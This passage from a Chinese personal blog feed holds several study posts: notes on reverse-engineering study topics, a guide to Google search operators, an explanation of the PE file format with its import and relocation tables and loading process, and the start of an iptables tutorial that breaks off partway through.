<p>各个工具的使用、分析流程的梳理、PE文件格式与加载流程、进程注入与Hook、Windows内核与驱动、反汇编反调试反虚拟机反沙箱、脱壳与加壳、补丁与保护机制等等，每一个都不是只看看理论就可以掌握的，要细看、要书画、要思考、要实践、要总结、要记录、要回顾、要更新。</p>
<p>恶意样本中基本分析流程与细致分析方法、各个类型家族实践总结、WinAPI\zfc\dll\reg积累、常见的入侵行为如感染、启动、隐蔽、持久化、核心功能点、样本处置措施三个，对于这些更要多多实践分析，学无止境。</p>
<p>漏洞研究先看基础、内核，再看书、<strong>实践复现</strong>等。</p>
]]></content>
      <categories>
        <category>【-专业知识-】逆向工程知识</category>
        <category>基础分析技术</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
        <tag>PE文件</tag>
      </tags>
  </entry>
  <entry>
    <title>B站-如何高效检索？</title>
    <url>/2023/10/20/%5B%E2%88%9A%5D%E5%A6%82%E4%BD%95%E6%A3%80%E7%B4%A2%EF%BC%9F/</url>
    <content><![CDATA[<blockquote>
<p>本篇文章来自B站up：檀东东Tango，从<code>信息资讯</code>、<code>知识技能</code>、<code>素材文件</code>、<code>工具软件</code>四个方面介绍如何高效搜索。</p>
</blockquote>
<h1 id="看前须知"><a href="#看前须知" class="headerlink" title="看前须知"></a>看前须知</h1><p>在具体学习之前，需要<strong>建立一个框架</strong>：</p>
<p><code>Why(为什么搜) + What(搜什么) ==&gt; Where(去哪里搜) + How(怎么搜)</code></p>
<p><strong>Why为什么搜</strong>：</p>
<ul>
<li>知道：know sth，知道一些新闻、获取一些信息</li>
<li>学习：learn sth，学习知识</li>
<li>创作：create sth，创作一些东西</li>
<li>完工：do sth，比较杂，完成某项特定的任务</li>
</ul>
<p><strong>What搜索什么</strong>：</p>
<ul>
<li>信息资讯</li>
<li>知识技能</li>
<li>素材文件</li>
<li>工具软件</li>
</ul>
<p>上二者不是一一对应的关系，一般<strong>以why为出发点</strong>，然后通过搜索上面四类达成目的。比如要<strong>学习视频剪辑</strong>的技能，就要搜索<code>知识技能</code>、<code>素材文件</code>、<code>工具软件</code>。</p>
<p>所以当你想要去搜索某些东西时，先<strong>确定好为什么搜</strong>，是想要简单了解某个信息（比如想知道今天的节气）、还是想要学习某种知识技能（比如学习病毒分析）还是想要创作一些东西（比如想要做一个党的精神谱系PPT）、还是只是想要完成某个任务（比如将PDF合并）</p>
<p>再列好为了完成你的目标<strong>需要搜索哪些东西</strong>，以上面的病毒分析为例，需要搜索：</p>
<ul>
<li>信息资讯：最近哪些病毒流行，这些病毒产生了什么危害等</li>
<li>知识技能：这一类病毒的原理是什么，该怎么去分析</li>
<li>素材文件：我如何获取该样本</li>
<li>工具软件：分析该病毒需要用到什么工具</li>
</ul>
<p>当确定好上述内容后，就可以进一步学习：<code>Where(去哪里搜)</code> + <code>How(怎么搜)</code>，下面就分类学习下：</p>
<h1 id="搜索信息资讯"><a href="#搜索信息资讯" class="headerlink" title="搜索信息资讯"></a>搜索信息资讯</h1><h2 id="给个结论："><a href="#给个结论：" class="headerlink" title="给个结论："></a><strong>给个结论</strong>：</h2><p><code>谷歌≈Bing &gt; 公众号 &gt; 短视频 &gt; 百度</code></p>
<h2 id="掌握搜索语法：谷歌适用"><a href="#掌握搜索语法：谷歌适用" class="headerlink" title="掌握搜索语法：谷歌适用"></a><strong>掌握搜索语法</strong>：谷歌适用</h2><ol>
<li><p>添加<code>双引号</code>：提供关键词，精准搜索，建议都下面都加上</p>
<p>比如：<code>”熊猫烧香“</code></p>
</li>
<li><p><code>intitle</code>：限定标题，筛选标题里带该文字的内容（顺序可能变）</p>
<p>比如：<code>intitle:熊猫烧香</code></p>
</li>
<li><p><strong>插播</strong>：可以将上二者组合，使得搜索结果标题必然出现某词语，且<strong>完整出现</strong></p>
</li>
<li><p><code>allintitle</code>：限定标题多个关键词</p>
<p>比如：<code>allintitle:病毒 熊猫烧香</code></p>
</li>
<li><p><code>intext</code>：限定文章内容里面的关键词</p>
<p>比如：<code>intext:熊猫烧香 病毒</code></p>
</li>
<li><p><code>inurl</code>：限定搜索结果网址关键词</p>
<p>比如：<code>熊猫烧香 inurl:cctv</code></p>
</li>
<li><p><code>site</code>：限定搜索结果的网站来源（<strong>必须完整域名</strong>）</p>
<p>比如：<code>熊猫烧香 site:cctv</code></p>
<p>常用的域名：<strong>199it.COM</strong>、<strong>zhihu.COM</strong></p>
</li>
<li><p><code>imagesize</code>：限制图片尺寸</p>
<p>比如：<code>熊猫 imagesize:2560x1440</code></p>
</li>
<li><p><code>filetype</code>：限定文件格式</p>
<p>比如：<code>卫星互联网 filetype:pdf</code></p>
<p>注：该方法是一个很好的<strong>扫盲方法</strong></p>
</li>
</ol>
<h2 id="直奔信息源头"><a href="#直奔信息源头" class="headerlink" title="直奔信息源头"></a>直奔信息源头</h2><p>在权威、信息发布平台搜索，看一手源头信息</p>
<h1 id="搜索知识技能"><a href="#搜索知识技能" class="headerlink" title="搜索知识技能"></a>搜索知识技能</h1><p><strong>网页类型：</strong></p>
<ul>
<li><code>谷歌</code>：最常用，核心工具</li>
<li><code>搜狗搜索</code>：可以在<strong>公众号</strong>和<strong>知乎</strong>里搜索</li>
<li><code>github、stack overflow、CSDN</code>：社群</li>
</ul>
<p>PDF文档：</p>
<ul>
<li><p><code>谷歌</code>：使用<code>filetype</code>语法搜索</p>
</li>
<li><p><code>inurl:baogao</code>：限定网站域名</p>
<img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231107000645880.png" alt="image-20231107000645880" style="zoom:33%;" />
</li>
<li><p><code>similarsites</code>：同类型网址搜索</p>
</li>
</ul>
<p><strong>学术论文</strong>：</p>
<ul>
<li><a href="https://pubscholar.cn/?continueFlag=67dc1e0d8f45af09eec4ca511a2dcc9b">pubscholar公益学术平台</a>：中科院发布</li>
<li><code>谷歌学术</code>：很全很好用</li>
<li><code>sci-hub</code>：免费论文，不支持搜索</li>
</ul>
<p><strong>电子书</strong>：</p>
<ul>
<li><code>鸠摩搜书</code>：中文搜索</li>
<li><code>best free ebook download sites</code>：英文搜索</li>
<li>得到APP\微信读书</li>
</ul>
<p><strong>视频教程</strong>：</p>
<ul>
<li><code>谷歌搜索</code>：best online learning websites</li>
<li>B站\油管\网易云课堂\腾讯课堂\可汗学院\Coursera\Udacity\edX\OpenCulture</li>
<li><code>百度网盘搜索引擎</code></li>
</ul>
<p><strong>其他宝藏资源</strong>：</p>
<ul>
<li>各大论坛：吾爱破解、看雪、安天论坛</li>
<li>笔记资料：语雀搜索、腾讯云、freebuf</li>
</ul>
<h1 id="搜索素材文件"><a href="#搜索素材文件" class="headerlink" title="搜索素材文件"></a>搜索素材文件</h1><ul>
<li>视频：<code>best sites for free stock videos</code></li>
<li>音频：<code>best sites for free bgm</code></li>
<li>gif动图：<code>best free gif</code></li>
<li>icon图标：<code>谷歌搜索 xxx icon filetype:png</code></li>
<li>PPT模板：<code>canva.com</code></li>
</ul>
<h1 id="搜索工具软件"><a href="#搜索工具软件" class="headerlink" title="搜索工具软件"></a>搜索工具软件</h1><p><strong>看看收藏</strong>。</p>
<p><strong>谷歌</strong>：<code>xxx需求+online</code></p>
<hr>
<h1 id="集成学习-AI："><a href="#集成学习-AI：" class="headerlink" title="集成学习+AI："></a>集成学习+AI：</h1><ul>
<li>搜索+学习：得到APP</li>
<li>学习+创作：<a href="https://www.canva.com/">canva</a></li>
<li>ChatGPT：<a href="https://www.poe.com/">poe</a></li>
</ul>
<hr>
<blockquote>
<p><strong>写在最后</strong>：<strong>为什么要搜索？</strong></p>
</blockquote>
<p>因为你想要做的事情，世界上99%的人都做过，且比你做得好。你要做的就是<code>找到它、学习它、利用它、超过它</code>。</p>
]]></content>
      <categories>
        <category>【+生活分享+】技能技巧</category>
        <category>学习技巧</category>
      </categories>
      <tags>
        <tag>学习技巧</tag>
        <tag>检索</tag>
      </tags>
  </entry>
  <entry>
    <title>PE文件与加载（提高）</title>
    <url>/2023/09/25/%5B%E2%88%9A%5D%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-PE%E6%96%87%E4%BB%B6%E4%B8%8E%E5%8A%A0%E8%BD%BD%EF%BC%88%E6%8F%90%E9%AB%98%EF%BC%89/</url>
    <content><![CDATA[<h1 id="PE文件与加载（提高）"><a href="#PE文件与加载（提高）" class="headerlink" title="PE文件与加载（提高）"></a>PE文件与加载（提高）</h1><blockquote>
<p><strong>写在最前面</strong>：本片文章不会细致介绍PE文件的基础知识，该内容详见博客。这篇文章主要是以书目录为主干，结合已有知识，梳理下PE文件相关知识，同时在学习的过程中整理下<strong>进程、DLL、内存</strong>的知识，与专业课博客结合，为后续学内核做铺垫。</p>
<p><strong>目标</strong>：</p>
<ol>
<li>回顾<strong>PE文件格式</strong>，过一下重点，记忆。</li>
<li>重点学习下一些常用的<strong>数据目录表</strong>，实践。</li>
<li>理清PE文件<strong>加载的流程</strong>，要规范语言、对应内容。</li>
<li>回顾<strong>操作系统</strong>博客，补充知识点，有话可说关于操作系统。</li>
<li>会涉及到一些<strong>加壳脱壳</strong>的内容，找一两个实践下。</li>
</ol>
</blockquote>
<p><strong>参考资料</strong>：</p>
<ol>
<li>《逆向工程核心原理》第二篇，PE文件格式。</li>
<li>吾爱上的一篇精华：<a href="https://www.52pojie.cn/thread-1820306-1-1.html">https://www.52pojie.cn/thread-1820306-1-1.html</a></li>
</ol>
<hr>
<h2 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h2><blockquote>
<p>能不能用自己的话大概解释一下<strong>PE文件的相关知识</strong>？</p>
</blockquote>
<p>从下面<strong>四个方面</strong>介绍：</p>
<ol>
<li>PE文件的<strong>定义</strong></li>
<li>PE文件的<strong>分类</strong></li>
<li>PE文件的<strong>结构</strong>，总分介绍，大体意思即可</li>
<li>PE文件的<strong>作用</strong></li>
</ol>
<p>下面<strong>具体说下</strong>：</p>
<ol>
<li><p><strong>PE文件的定义</strong>：</p>
<p>PE文件是一种可执行文件格式，一般是指Win32下的可执行文件。</p>
<p>可执行文件是一种<strong>包含可执行代码的二进制文件</strong>，它包含了计算机程序的机器指令和其他必要的数据，以便操作系统能够<strong>加载和执行该程序</strong>。</p>
</li>
<li><p><strong>PE文件分类</strong>：</p>
<p>可以将PE文件分为四类：</p>
<ul>
<li><p><strong>可执行系列</strong>：如<code>exe文件</code>，是Windows操作系统中的<strong>可执行文件格式</strong>，通常是用C、C++、C#、Visual Basic等编程语言编写的应用程序的输出文件；又如<code>SCR文件</code>，是<code>exe文件</code>的一种特殊格式，即<strong>屏幕保护程序</strong>。</p>
</li>
<li><p><strong>库系列</strong>：如DLL动态链接库文件存储可重用的代码和数据、LIB静态链接库是文件编译时与应用程序静态链接的代码和数据集合。</p>
</li>
<li><p><strong>驱动程序系列</strong>：如SYS，驱动程序是用于<strong>与硬件设备进行交互的软件模块</strong>。</p>
</li>
<li><p><strong>对象文件系列</strong>：如OBJ文件，用于<strong>存储编译器生成的目标代码</strong>（Object Code）和相关的符号信息。OBJ文件通常是编译器生成的<strong>中间文件</strong>，用于在链接器（Linker）的过程中将多个目标文件和库文件合并成可执行文件。</p>
</li>
</ul>
<p><strong>注意</strong>：无论是可执行文件、动态链接库还是其他类型的PE文件，它们都遵循<strong>PE文件格式的规范</strong>，以便在Windows操作系统中<strong>正确加载和执行</strong>。</p>
</li>
<li><p><strong>PE文件格式：</strong></p>
<p>学习PE文件结构就是<strong>学习PE头里的结构体</strong>，关于这些结构体的分类、各个字段的含义在另一篇博客详细介绍过，这里不再赘述。我们说下没有涉及的点。</p>
<ul>
<li><p>首先是<strong>DOS头</strong>，该头部主要是<strong>考虑对DOS文件的兼容</strong>，即在DOS模式下也可以执行该文件，只是会根据DOS存根进行执行，比如一般会输出字符串提示：<code>This is  progarm cannot be run in DOS mode</code>；同时在DOS头里要注意两个字段：<code>e_magic</code>和<code>e_ifanew</code>，前者是双字节，存储”MZ”即<strong>DOS签名</strong>，后者是Long，存储<strong>PE标识的偏移</strong>。</p>
</li>
<li><p>然后是<strong>PE头</strong>，该头部由三部分组成：<code>PE标识</code>、<code>文件头</code>、<code>可选头</code>。</p>
<p><code>PE标识</code>就是前面DOS头里的<code>ifanew字段</code>指向的数据，4个字节-<code>“PE”00</code>，属于文件签名。</p>
<p><code>PE文件头</code>存储文件<strong>本身的一些基本信息</strong>，如机器架构(machine)、文件信息（0002h为exe文件、2000h为DLL文件）、可选头大小、节表数量、创建时间等。</p>
<p><code>PE可选头</code>描述文件<strong>加载过程的相关信息</strong>，虽说是可选头，其实是必须具备的，甚至可以说是最重要的头部。有几个需要重点关注的字段：<code>magic</code>&#x3D;文件类型（10B是32位，20B是64位）、EP&#x3D;<code>入口地址的</code>RVA、<code>ImageBase</code>&#x3D;加载的基址、<code>Alignment</code>&#x3D;文件、内存的对其粒度即节区的最小单位、<code>SizeOfImage</code>&#x3D;内存中文件镜像的大小、<code>SizeOfHeader</code>&#x3D;PE头的大小，还有<code>数据目录</code>的大小与数据目录表。</p>
<p>关于数据目录，需要重点关注<code>导入、导出、重定向、资源、调试、TLS</code>这几个即可。</p>
</li>
<li><p>接着是<strong>节表</strong>，每一个节表对应一个节区，其中包含节区的<code>名称、大小、RVA、FOA、属性</code>等。注意<strong>以虚拟大小确定节区数据的实际大小</strong>。</p>
</li>
</ul>
<p>OK，到这里就算是简单了解了<strong>PE文件的基本格式</strong>，在实际使用中，可以提高<strong>PE文件工具</strong>查看PE文件的具体信息，如下：</p>
<img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230918165444418.png" alt="image-20230918165444418" style="zoom: 67%;" />


</li>
<li><p><strong>PE文件的作用</strong>：</p>
<p>PE文件为所有的WIN32下可执行文件<strong>设置统一的结构和格式</strong>，以便操作系统能够正确地<strong>加载和执行程序</strong>。同时保证文件的兼容性、可移植性。</p>
</li>
</ol>
<p><strong>歌曰</strong>：在你向别人描述你对于PE文件的理解时，重点在<strong>整体宏观</strong>，而不是某个细节的字段；在进行具体的分析调试时，很多字段也没什么用，关键在于理解<strong>内存中的布局</strong>以及<strong>各个区域的作用</strong>。</p>
<h2 id="几个重要的数据目录"><a href="#几个重要的数据目录" class="headerlink" title="几个重要的数据目录"></a>几个重要的数据目录</h2><blockquote>
<p>了解基本的PE文件格式只是基础，在实际分析中，需要重点关注下面几个重要的数据结构。<strong>导入、导出表</strong>已经学习过了，这里重点放在<code>重定位表</code>。</p>
</blockquote>
<h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><p>导入表的具体结构不再赘述，理解之后就很好记忆了。这里主要强调一下，<strong>导入表与IAT表是关联在一起的</strong>，在载入时会通过导入表信息解析得到需要导入的DLL和函数，然后将函数的实际地址写入IAT里。</p>
<p><strong>具体的解析过程</strong>如下：</p>
<ol>
<li>读取IID的<code>Name成员</code>，获取库名称字符串</li>
<li>装载相应库–使用<code>Loadlibrary</code>函数</li>
<li>读取IID的<code>OriginalFirstThunk成员</code>，获取INT地址（也就是导入函数名称表）</li>
<li>逐一读取INT数组的值，获取<code>IMAGE_IMPORT_NAME</code>地址</li>
<li>根据上地址的内容使用<code>GetProcAddress</code>获取该函数的实际地址</li>
<li>读取IID的<code>FirstThunk</code>内容，获取<code>IAT</code>的地址（IAT就是导入地址表）</li>
<li>将5的地址填入<code>IAT数组</code>里。</li>
<li>重复<strong>4~7步骤</strong>，直到<strong>INT</strong>结束。</li>
</ol>
<h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><blockquote>
<p> 先说说为什么要有重定位表？</p>
</blockquote>
<p>原因很简单，有些可执行文件在加载到内存后，其镜像基址并没有遵循PE头中的默认位置，比如<code>exe的400000h</code>，又或者<code>DLL的10000000h</code>。但是在这个可执行文件内部，有很多地方都是<strong>使用硬编码地址</strong>进行代码的指向或者数据的引用。（这个硬编码地址就是VA &#x3D; RVA+IB)  </p>
<p>所以一旦这些文件的加载基址发生了变化，这些硬编码的地址也就失去了作用，这时候就需要<strong>对硬编码地址进行修正</strong>。如何修正呢？<strong>使用重定位表</strong>！</p>
<p>换句话说，<strong>修正硬编码地址的过程就是重定位</strong>。</p>
<blockquote>
<p><strong>重定位表的结构</strong>是什么样的？</p>
</blockquote>
<p>重定位表的结构如下，主要有两个字段：<code>VirtualAddress</code>、<code>TypeOffset[1]</code>和<code>sizeOfBlock</code>。具体介绍如下：</p>
<ul>
<li><code>VirtualAddress</code>：4字节，是一个页面的起始地址，也就是基址。</li>
<li><code>sizeOfBlock</code>：重定位块的大小。</li>
<li><code>TypeOffset[1]</code>：需要修正数据的地址偏移。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress; <span class="comment">// 重定位数据页面起始地址</span></span><br><span class="line">    DWORD   SizeOfBlock;        <span class="comment">// 重定位块的长度</span></span><br><span class="line"><span class="comment">//WORD    TypeOffset[1];        // 重定位项数组</span></span><br><span class="line">    <span class="comment">//该数组每个元素占2字节,加上VirtualAddress后才是真实地址</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="comment">//最后一个块的值全为0</span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION*,PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure>

<p><strong>歌曰</strong>：每一个重定位块都是<strong>以一个页为单位</strong>进行指向的，而一个页的大小一般为<code>4K</code>，也就是说只需要<code>12位</code>就可以表示，所以<code>TypeOffset[1]</code>的16位用不完。实际处理是：将<strong>前4位作为标志位</strong>，当其为<code>0011</code>时表示需要修改；而后12位作为偏移位，与<code>VirtualAddress</code>相加得到具体的<code>RVA</code>，从而定位到<strong>硬编码地址</strong>处。</p>
<p>**<a href="https://www.52pojie.cn/thread-1820306-1-1.html#47641558_%E5%AF%BC%E5%87%BA%E8%A1%A8">借一个图</a>**：</p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230925143421304.png" alt="image-20230925143421304"></p>
<blockquote>
<p><strong>什么时候要进行重定位</strong>嘞？</p>
</blockquote>
<p>答案也很明确，可执行文件加载时进行。一般来说是先将文件映射到虚拟内存空间而后检查重定位表进行重定位操作。</p>
<p><strong>歌曰</strong>：重定位操作修正的<strong>已经加载到内存中的数据</strong>，不会对原始DLL造成影响。</p>
<p><strong>歌曰</strong>：并不是只有DLL才进行重定位，现在系统都会采用<strong>ASLR机制</strong>即随机空间布局随机化，每一次可执行文件的加载都会有不同的基址。</p>
<blockquote>
<p><strong>如何进行重定位</strong>呢？</p>
</blockquote>
<ul>
<li><strong>定位数据</strong>：加载后会先把文件数据映射到虚拟内存空间，之后会根据PE头的数据定位到重定位表，每一个重定位块对应一个页，根据<code>Vir+off = RVA</code>得到某个硬编码数据的地址，将该地址与IB相加后得到VA，也就可以精确定位到该硬编码数据；</li>
<li><strong>修改数据</strong>：将<code>原始数据-原始IB+现在IB</code>即可</li>
<li><strong>循环执行</strong>：直到把<strong>需要修改的硬编码数据</strong>修改完毕</li>
</ul>
<blockquote>
<p>下面是<strong>一个小小的实践</strong>！</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230925150648365.png" alt="image-20230925150648365"></p>
<p>如上图所示，该重定位块标注了第一个页里需要修改的数据RVA。我们以第一个地址为例，其<code>RVA=1000h+420h=1420h</code>，该地址处的数据为 <code>010010C4h</code>（见<strong>下图ida数据</strong>）；而将其加载到内存后该硬编码地址为 <code>00481420h</code>（见<strong>下OD图</strong>），可以看到数据变了，也可以借此计算出本次的基址为<code>00480000h</code>。</p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230925152208255.png" alt="image-20230925152208255"></p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230925152551871.png" alt="image-20230925152551871"></p>
<h2 id="PE文件的加载流程"><a href="#PE文件的加载流程" class="headerlink" title="PE文件的加载流程"></a>PE文件的加载流程</h2><blockquote>
<p>下面我们来简单整理下<strong>PE文件的加载流程</strong>，经过前面的学习与积累，这一步总结就很简单了。</p>
</blockquote>
<ol>
<li><strong>定位文件</strong>：操作系统根据应用程序的路径或者相对路径，通过文件系统定位到PE文件的位置。</li>
<li><strong>解析PE头</strong>：操作系统读取PE文件的头部信息，即PE头。PE头包含了文件的基本信息，如文件格式版本、入口点地址、节表等。</li>
<li><strong>加载PE文件</strong>：操作系统根据PE头中的信息，为PE文件分配内存空间。这包括分配可执行代码的内存区域、数据区域和导入表等。同时，操作系统会<strong>建立PE文件与内存空间的映射关系</strong>。</li>
<li><strong>进行重定位</strong>：如果当前加载到内存当中的基址与op的IB一样，则无需要重定位。否则获取到重定位表的块数据后，根据他的(块长度-8)&#x2F;2得到该块的地址数量，前8字节存放着该块的偏移和大小，每个占4字节，一个重定位地址占2字节，通过块地址+8+(2i)取出需要重定位的地址，与0x3000进行异或，如果首位为3，则后12位为地址偏移，则重定位地址&#x3D;后12位(块中偏移)+块的起始位置+内存起始位置 重定位则为重定位地址&#x3D;重定位地址+(理想基址和实际基址的偏移) 即*重定位地址+&#x3D;(实际基址-理想基址)。如果首位为0，则说明该偏移为对齐使用，遍历下一个(当前块基址+当前块长度)。将全部块遍历重定位完后，将op的IB也替换成当前加载到内存的基址。</li>
<li><strong>解析导入表</strong>：PE文件中包含有关其依赖的其他模块（如DLL）的导入表。操作系统会解析导入表，对每个依赖的模块进行<strong>加载和链接</strong>。</li>
<li><strong>执行入口点</strong>：找到PE文件的入口点地址，即程序的起始执行地址。操作系统将控制权转移给PE文件的入口点，开始执行应用程序的代码。</li>
</ol>
<blockquote>
<p>先到这里吧，后面又新的学习成果再进行补充。</p>
</blockquote>
]]></content>
      <categories>
        <category>【-专业知识-】逆向工程知识</category>
        <category>PE文件基础</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
        <tag>PE文件</tag>
      </tags>
  </entry>
  <entry>
    <title>iptables指令详解</title>
    <url>/2023/05/01/iptables%E6%8C%87%E4%BB%A4%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong>：文章为指令详解，搜集网上资料并进行归纳。</p>
</blockquote>
<p>参考文献1：<a href="https://blog.csdn.net/lvoelife/article/details/129101416">https://blog.csdn.net/lvoelife/article/details/129101416</a></p>
<p>参考文献2：<a href="https://www.w3cschool.cn/linuxc/linuxc-6ghl3lgn.html">https://www.w3cschool.cn/linuxc/linuxc-6ghl3lgn.html</a></p>
<ul>
<li><a href="#%E5%BC%95%E8%A8%80">引言</a></li>
<li><a href="#iptables%E7%9A%84%E5%9B%9B%E8%A1%A8%E4%BA%94%E9%93%BE">iptables的四表五链</a><ul>
<li><a href="#%E4%BD%95%E4%B8%BA%E5%9B%9B%E8%A1%A8">何为四表</a></li>
<li><a href="#%E4%BD%95%E4%B8%BA%E4%BA%94%E9%93%BE">何为五链</a></li>
<li><a href="#iptables%E8%AF%AD%E6%B3%95%E6%A0%BC%E5%BC%8F">iptables语法格式</a></li>
</ul>
</li>
<li><a href="#%E8%A7%84%E5%88%99%E7%9A%84%E6%9F%A5%E7%9C%8B%E4%B8%8E%E6%B8%85%E9%99%A4">规则的查看与清除</a><ul>
<li><a href="#%E6%9F%A5%E7%9C%8B%E8%A7%84%E5%88%99">查看规则</a></li>
<li><a href="#%E6%B7%BB%E5%8A%A0%E8%A7%84%E5%88%99">添加规则</a></li>
<li><a href="#%E4%BF%AE%E6%94%B9%E8%A7%84%E5%88%99">修改规则</a></li>
<li><a href="#%E5%88%A0%E9%99%A4%E8%A7%84%E5%88%99">删除规则</a></li>
</ul>
</li>
<li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E5%A4%87%E4%BB%BD%E4%B8%8E%E8%BF%98%E5%8E%9F">防火墙的备份与还原</a></li>
<li><a href="#%E5%87%A0%E4%B8%AA%E5%AE%9E%E4%BE%8B">几个实例</a></li>
</ul>
<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p><code>iptables</code>是Linux下的一个防火墙软件，可以用于<strong>设置、修改、删除</strong>防火墙规则。它的功能包括：过滤数据包、NAT、端口映射、限制连接数等等。</p>
<h1 id="iptables的四表五链"><a href="#iptables的四表五链" class="headerlink" title="iptables的四表五链"></a>iptables的四表五链</h1><p>正如我们在上文知道的，<code>iptables</code>是集成在<code>Linux内核</code>中的包过滤防火墙系统。</p>
<p>使用<code>iptables</code>可以<strong>添加、删除</strong>具体的过滤规则，它默认维护着 <code>4 个表</code>和 <code>5 个链</code>，所有的防火墙策略规则都被分别写入这些表与链中。</p>
<h2 id="何为四表"><a href="#何为四表" class="headerlink" title="何为四表"></a>何为四表</h2><p><code>四表</code>是指<strong>iptables的功能</strong>，默认的<strong>iptable规则表</strong>如下：</p>
<ul>
<li><code>filter</code>表(过滤规则表)：控制数据包<strong>是否允许进出及转发</strong>，可以控制的链路有<code>INPUT</code>、<code>FORWARD</code>和<code>OUTPUT</code>。</li>
<li><code>nat</code>表(地址转换规则表)：控制数据包中<strong>地址转换</strong>，可以控制的链路有<code>PREROUTING</code>、<code>INPUT</code>、<code>OUTPUT</code>和<code>POSTROUTING</code>。</li>
<li><code>mangle</code>表(修改数据标记位规则表)：<strong>修改数据包</strong>中的原数据，可以控制的链路有<code>PREROUTING</code>、INPUT、<code>OUTPUT</code>、<code>FORWARD</code>和<code>POSTROUTING</code>。</li>
<li><code>raw</code>表(跟踪数据表规则表)：控制nat表中<strong>连接追踪机制的启用状况</strong>，可以控制的链路有 <code>PREROUTING</code>、<code>OUTPUT</code>。</li>
</ul>
<h2 id="何为五链"><a href="#何为五链" class="headerlink" title="何为五链"></a>何为五链</h2><p><code>五链</code>是指内核中控制网络的NetFilte 定义的<strong>5个规则链</strong>。</p>
<p>每个规则表中包含多个数据链：</p>
<ul>
<li><strong>INPUT</strong>：入站数据过滤</li>
<li><strong>OUTPUT</strong>：出站数据过滤</li>
<li><strong>FORWARD</strong>：转发数据过滤</li>
<li><strong>PREROUTING</strong>：路由前过滤</li>
<li><strong>POSTROUTING</strong>：路由后过滤</li>
</ul>
<p>防火墙规则需要写入到这些具体的数据链中，Linux防火墙的<strong>过滤框架</strong>，如下图所示：</p>
<p><img src="https://images-blog-qidangge.oss-cn-shenzhen.aliyuncs.com/image/1681186246118.png"></p>
<ul>
<li>可以看出，如果是<strong>外部主机发送数据包</strong>给防火墙本机，数据将会经过<code>PREROUTING</code>链与<code>INPUT</code>链。</li>
<li>如果是防火墙本机<strong>发送数据包到外部主机</strong>，数据将会经过<code>OUTPUT</code>链与 <code>POSTROUTING</code>链。</li>
<li>如果防火墙<strong>作为路由负责转发数据</strong>，则数据将经过<code>PREROUTING</code>链、<code>FORWARD</code>链以 <code>POSTROUTING</code>链。</li>
</ul>
<h2 id="iptables语法格式"><a href="#iptables语法格式" class="headerlink" title="iptables语法格式"></a>iptables语法格式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables [-t table] COMMAND [chain] CRETIRIA -j ACTION</span><br></pre></td></tr></table></figure>

<p>各<strong>参数的含义</strong>如下：</p>
<ul>
<li><code>-t</code>：指定需要维护的<code>防火墙规则表</code>filter、nat、mangle或raw。在不使用-t时则<strong>默认使用filter表</strong></li>
<li><code>COMMAND</code>：<strong>子命令</strong>，定义对规则的管理</li>
<li><code>chain</code>：指明链表</li>
<li><code>CRETIRIA</code>：匹配参数</li>
<li><code>ACTION</code>：触发动作</li>
</ul>
<blockquote>
<p><strong>iptables命令(COMMAND）的常用选项</strong>，以及各自的功能，如下图所示：</p>
</blockquote>
<p><img src="https://images-blog-qidangge.oss-cn-shenzhen.aliyuncs.com/image/1681186741203.png"></p>
<blockquote>
<p>iptables命令的<strong>常用匹配参数</strong>，以及各自的功能，如下图所示</p>
</blockquote>
<p><img src="https://images-blog-qidangge.oss-cn-shenzhen.aliyuncs.com/image/1681186853746.png"></p>
<blockquote>
<p>iptables命令的<strong>触发动作</strong>，以及各自的功能，如下图所示</p>
</blockquote>
<p><img src="https://images-blog-qidangge.oss-cn-shenzhen.aliyuncs.com/image/1681186879488.png"></p>
<p>内核会按照顺序依次检查iptables防火墙规则，如果发现有匹配的规则目录，则立刻执行相关动作，停止继续向下查找规则目录。</p>
<p>如果所有的防火墙规则都未能匹配成功，则按照默认策略处理。</p>
<p>使用<code>-A</code> 项添加防火墙规则会将该规则<strong>追加到整个链的最后</strong>，而使用<code>-I</code>选项添加的防火墙规则则会默认插入到<strong>链中作为第一条规则</strong>。</p>
<h1 id="规则的查看与清除"><a href="#规则的查看与清除" class="headerlink" title="规则的查看与清除"></a>规则的查看与清除</h1><h2 id="查看规则"><a href="#查看规则" class="headerlink" title="查看规则"></a>查看规则</h2><p>使用如下命令查看规则：<code>iptables -nvL</code></p>
<ul>
<li>-L表示查看<strong>当前表的所有规则</strong>，默认查看的是filter表，如果要查看nat表，可以加上-t nat参数。</li>
<li>-n表示<strong>不对IP地址进行反查</strong>，添加此参数显示速度将会加快。</li>
<li>-v表示<strong>输出详细信息</strong>，包含通过该规则的数据包数量、总字节数以及相应的网络接口</li>
</ul>
<h2 id="添加规则"><a href="#添加规则" class="headerlink" title="添加规则"></a>添加规则</h2><p>有两个参数为添加规则，它们分别是<code>-A和-I</code>：</p>
<ul>
<li>-A是添加到<strong>规则的末尾</strong></li>
